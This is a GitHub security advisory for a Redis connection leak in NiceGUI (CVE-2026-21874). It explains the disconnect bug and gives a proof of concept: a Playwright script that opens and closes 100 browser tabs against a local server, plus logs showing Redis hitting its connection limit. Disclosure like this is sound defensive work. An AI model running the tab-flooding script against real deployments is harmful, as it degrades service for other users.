# [M] NiceGUI has Redis connection leak via tab storage causes service degradation

## Summary
Severity: Medium
Advisory: GHSA-mp55-g7pj-rvm2
CVE: CVE-2026-21874
CWE: CWE-772
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-01-08
Source: https://github.com/advisories/GHSA-mp55-g7pj-rvm2
Type: github-advisory

## Affected
- PyPI: `nicegui` — affected >=2.10.0 <3.5.0

## Details
### Summary
An unauthenticated attacker can exhaust Redis connections by repeatedly opening and closing browser tabs on any NiceGUI application using Redis-backed storage. Connections are never released, leading to service degradation when Redis hits its connection limit.
**NiceGUI continues accepting new connections - errors are logged but the app stays up with broken storage functionality.**

### Details
When a client disconnects, tab_id is cleared at https://github.com/zauberzeug/nicegui/blob/main/nicegui/client.py#L307 before delete() is called at https://github.com/zauberzeug/nicegui/blob/main/nicegui/client.py#L319. By then tab_id is None, so there's no way to find the RedisPersistentDict and call https://github.com/zauberzeug/nicegui/blob/main/nicegui/persistence/redis_persistent_dict.py#L92.

Each tab creates a RedisPersistentDict with a Redis client connection and a pubsub subscription. These are never closed, accumulating until Redis maxclients is reached.

### PoC
#### Test server (test_connection_leak.py)

```python
import os
import logging
from datetime import timedelta

import redis
from nicegui import ui, app
from nicegui.client import Client

logging.basicConfig(level=logging.WARNING, format="%(asctime)s %(levelname)s %(message)s")
logging.getLogger("leak").setLevel(logging.INFO)
log = logging.getLogger("leak")

_original_handle_disconnect = Client.handle_disconnect
_original_delete = Client.delete


def _patched_handle_disconnect(self, socket_id: str) -> None:
    tab_id_before = self.tab_id
    _original_handle_disconnect(self, socket_id)
    log.warning("disconnect: tab_id=%s cleared, tabs=%d", tab_id_before, len(app.storage._tabs))


def _patched_delete(self) -> None:
    tab_id = self.tab_id
    tabs_before = len(app.storage._tabs)
    _original_delete(self)
    log.error("delete: tab_id=%s, tabs=%d->%d", tab_id, tabs_before, len(app.storage._tabs))


Client.handle_disconnect = _patched_handle_disconnect
Client.delete = _patched_delete

_last_stats: tuple[int, int] = (0, 0)


def log_stats() -> None:
    global _last_stats
    client = redis.from_url(os.environ["NICEGUI_REDIS_URL"])
    conns = client.info("clients")["connected_clients"]
    client.close()
    tabs = len(app.storage._tabs)
    if (conns, tabs) != _last_stats:
        log.info("stats: conns=%d tabs=%d", conns, tabs)
        _last_stats = (conns, tabs)


@ui.page("/")
async def main():
    await ui.context.client.connected()
    app.storage.tab["visited"] = True
    ui.label("Check logs")
    ui.timer(interval=2.0, callback=log_stats)


if __name__ == "__main__":
    app.storage.max_tab_storage_age = timedelta(days=30).total_seconds()
    ui.run(storage_secret="test", reconnect_timeout=2.0, reload=False)
```

#### Attack script (attack_connection_leak.py)

```python
import asyncio
from playwright.async_api import async_playwright


async def attack(url: str, num_tabs: int) -> None:
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        for i in range(num_tabs):
            context = await browser.new_context()
            page = await context.new_page()
            try:
                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
                await page.wait_for_timeout(500)
            except Exception:
                pass
            await context.close()
        await browser.close()


if __name__ == "__main__":
    asyncio.run(attack(url="http://127.0.0.1:8080/", num_tabs=100))
```

#### Steps to reproduce

1. Limit Redis connections: `redis-cli CONFIG SET maxclients 50`
2. Start server: `NICEGUI_REDIS_URL=redis://localhost:6379/0 python test_connection_leak.py`
3. Run attack: `python attack_connection_leak.py`
4. Observe server logs - Redis refuses connections:
```
NiceGUI ready to go on http://localhost:8080, http://10.201.1.10:8080, http://127.94.0.1:8080, http://127.94.0.2:8080, and http://192.168.0.15:8080
2026-01-01 17:19:43,226 INFO stats: conns=12 tabs=1
2026-01-01 17:19:45,945 INFO stats: conns=14 tabs=1
2026-01-01 17:21:14,504 INFO stats: conns=16 tabs=2
2026-01-01 17:21:14,506 WARNING disconnect: tab_id=4c1fc610-0fa9-4e8f-bb7a-c7882d22e599 cleared, tabs=2
2026-01-01 17:21:16,339 INFO stats: conns=19 tabs=3
2026-01-01 17:21:16,963 ERROR delete: tab_id=None, tabs=3->3
2026-01-01 17:21:16,964 WARNING disconnect: tab_id=e62f8ff3-9b91-431c-a66e-ce64dc37fc41 cleared, tabs=3
2026-01-01 17:21:17,563 INFO stats: conns=20 tabs=3
2026-01-01 17:21:18,342 INFO stats: conns=21 tabs=3
2026-01-01 17:21:19,397 INFO stats: conns=23 tabs=4
2026-01-01 17:21:20,022 ERROR delete: tab_id=None, tabs=4->4
2026-01-01 17:21:20,022 WARNING disconnect: tab_id=acafc0de-83bd-4919-8a78-e7775eb5b0cb cleared, tabs=4
2026-01-01 17:21:21,952 INFO stats: conns=27 tabs=5
2026-01-01 17:21:23,204 ERROR delete: tab_id=None, tabs=5->5
2026-01-01 17:21:23,204 WARNING disconnect: tab_id=56df6fab-7342-4823-8cc4-0e997d9da40a cleared, tabs=5
2026-01-01 17:21:23,829 INFO stats: conns=28 tabs=5
2026-01-01 17:21:25,280 INFO stats: conns=29 tabs=5
2026-01-01 17:21:25,881 ERROR delete: tab_id=None, tabs=5->5
2026-01-01 17:21:26,578 INFO stats: conns=30 tabs=5
2026-01-01 17:21:27,567 INFO stats: conns=32 tabs=6
2026-01-01 17:21:27,569 WARNING disconnect: tab_id=f1f79c1e-80ef-4753-a228-fdc13eb29e19 cleared, tabs=6
2026-01-01 17:21:28,579 INFO stats: conns=34 tabs=6
2026-01-01 17:21:29,449 INFO stats: conns=35 tabs=7
2026-01-01 17:21:30,074 ERROR delete: tab_id=None, tabs=7->7
2026-01-01 17:21:30,075 WARNING disconnect: tab_id=9f1326eb-75d8-4ea3-99fb-e47f54d45371 cleared, tabs=7
2026-01-01 17:21:30,701 INFO stats: conns=36 tabs=7
2026-01-01 17:21:31,454 INFO stats: conns=37 tabs=7
2026-01-01 17:21:32,531 INFO stats: conns=40 tabs=8
2026-01-01 17:21:33,185 ERROR delete: tab_id=None, tabs=8->8
2026-01-01 17:21:33,185 WARNING disconnect: tab_id=5f0b0e71-0ea0-4488-b392-cda09299a8f2 cleared, tabs=8
2026-01-01 17:21:34,436 INFO stats: conns=40 tabs=9
2026-01-01 17:21:35,063 WARNING disconnect: tab_id=a6e014ed-e76e-449d-a6eb-e8676cca1cc5 cleared, tabs=9
2026-01-01 17:21:35,685 INFO stats: conns=41 tabs=9
2026-01-01 17:21:35,686 ERROR delete: tab_id=None, tabs=9->9
2026-01-01 17:21:36,411 INFO stats: conns=42 tabs=9
2026-01-01 17:21:37,479 INFO stats: conns=45 tabs=10
2026-01-01 17:21:38,112 ERROR delete: tab_id=None, tabs=10->10
2026-01-01 17:21:38,112 WARNING disconnect: tab_id=9dd7a6ca-50da-436a-966f-38c835b65f7b cleared, tabs=10
2026-01-01 17:21:39,342 INFO stats: conns=48 tabs=11
2026-01-01 17:21:39,600 ERROR max number of clients reached
Traceback (most recent call last):
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/nicegui/timer.py", line 111, in _invoke_callback
    result = self.callback()
  File "/Users/dyudelevich/dev/test_connection_leak.py", line 45, in log_stats
    conns = client.info("clients")["connected_clients"]
            ~~~~~~~~~~~^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/commands/core.py", line 1005, in info
    return self.execute_command("INFO", section, *args, **kwargs)
           ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/client.py", line 657, in execute_command
    return self._execute_command(*args, **options)
           ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/client.py", line 663, in _execute_command
    conn = self.connection or pool.get_connection()
                              ~~~~~~~~~~~~~~~~~~~^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/utils.py", line 196, in wrapper
    return func(*args, **kwargs)
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py", line 2601, in get_connection
    connection.connect()
    ~~~~~~~~~~~~~~~~~~^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py", line 846, in connect
    self.connect_check_health(check_health=True)
    ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py", line 869, in connect_check_health
    self.on_connect_check_health(check_health=check_health)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py", line 941, in on_connect_check_health
    auth_response = self.read_response()
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py", line 1133, in read_response
    response = self._parser.read_response(disable_decoding=disable_decoding)
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/_parsers/resp2.py", line 15, in read_response
    result = self._read_response(disable_decoding=disable_decoding)
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/_parsers/resp2.py", line 38, in _read_response
    raise error
redis.exceptions.ConnectionError: max number of clients reached
2026-01-01 17:21:39,618 WARNING disconnect: tab_id=711835bb-3677-44cc-a406-abb8ae487370 cleared, tabs=11
2026-01-01 17:21:39,618 WARNING Could not load data from Redis with key nicegui:tab-711835bb-3677-44cc-a406-abb8ae487370
2026-01-01 17:21:40,242 INFO stats: conns=49 tabs=11
2026-01-01 17:21:40,244 ERROR delete: tab_id=None, tabs=11->11
2026-01-01 17:21:40,502 WARNING Could not load data from Redis with key nicegui:user-3876bd1e-5769-43ef-8c78-6e5e77ae3436
2026-01-01 17:21:40,502 ERROR max number of clients reached
Traceback (most recent call last):
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/nicegui/background_tasks.py", line 93, in _handle_exceptions
    task.result()
    ~~~~~~~~~~~^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/nicegui/persistence/redis_persistent_dict.py", line 81, in backup
    if not await self.redis_client.exists(self.key) and not self:
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/client.py", line 720, in execute_command
    conn = self.connection or await pool.get_connection()
                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py", line 1198, in get_connection
    await self.ensure_connection(connection)
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py", line 1231, in ensure_connection
    await connection.connect()
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py", line 298, in connect
    await self.connect_check_health(check_health=True)
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py", line 324, in connect_check_health
    await self.on_connect_check_health(check_health=check_health)
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py", line 410, in on_connect_check_health
    auth_response = await self.read_response()
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py", line 607, in read_response
    response = await self._parser.read_response(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        disable_decoding=disable_decoding
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/_parsers/resp2.py", line 82, in read_response
    response = await self._read_response(disable_decoding=disable_decoding)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/_parsers/resp2.py", line 102, in _read_response
    raise error
redis.exceptions.ConnectionError: max number of clients reached
```
2026-01-01 17:21:39,600 ERROR max number of clients reached
redis.exceptions.ConnectionError: max number of clients reached

## Impact

Affects all NiceGUI deployments using Redis storage. No authentication required. Attacker opens/closes browser tabs until Redis refuses new connections. NiceGUI handles errors gracefully so the app stays up, but new users lose persistent storage (tab/user data not saved) and any Redis-dependent functionality breaks.

## References
- https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mp55-g7pj-rvm2
- https://nvd.nist.gov/vuln/detail/CVE-2026-21874
- https://github.com/zauberzeug/nicegui/commit/6c52eb2c90c4b67387c025b29646b4bc1578eb83
- https://github.com/zauberzeug/nicegui
- https://github.com/zauberzeug/nicegui/releases/tag/v3.5.0
